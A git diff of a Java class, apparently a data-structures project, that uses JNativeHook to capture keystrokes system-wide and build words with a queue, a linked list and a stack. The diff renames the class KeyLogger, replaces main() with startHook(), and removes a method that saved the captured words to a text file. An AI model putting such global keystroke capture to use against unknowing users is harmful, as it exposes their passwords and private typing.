@@ -9,13 +9,13 @@ import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
 import java.io.*;
 import java.util.Stack;
 
-public class Main implements NativeKeyListener {
+public class KeyLogger implements NativeKeyListener {
     static Queue<Character> queue;
     static LinkedList<String> linkedList;
     static Stack<String> stack;
     static StringBuilder word;
 
-    Main() {
+    KeyLogger() {
         queue = new Queue<>();
         linkedList = new LinkedList<>();
         stack = new Stack<>();
@@ -39,7 +39,7 @@ public class Main implements NativeKeyListener {
 
     // key code is the virtual code assigned to each special key to generate their words counterpart
 
-    public static void main(String[] args) {
+    public  void startHook() {
         try {
             GlobalScreen.registerNativeHook();
         } catch (NativeHookException ex) {
@@ -47,7 +47,7 @@ public class Main implements NativeKeyListener {
             System.err.println(ex.getMessage());
             System.exit(1);
         }
-        GlobalScreen.addNativeKeyListener(new Main());
+        GlobalScreen.addNativeKeyListener(new KeyLogger());
     }
 
     @Override
@@ -67,7 +67,7 @@ public class Main implements NativeKeyListener {
             while (!queue.isEmpty()) word.append(queue.remove());
             linkedList.add(word.toString());
             System.out.println("Resultant Linked List : " + linkedList);
-            writeToFile();
+//            writeToFile();
             word.setLength(0);
         }
     }
@@ -83,11 +83,4 @@ public class Main implements NativeKeyListener {
         }
     }
 
-    void writeToFile() {
-        try (FileWriter fw = new FileWriter(new File(".\\src\\win.txt"), false)) {
-            fw.write(linkedList.toString());
-        } catch (IOException e) {
-            throw new RuntimeException(e);
-        }
-    }
 }
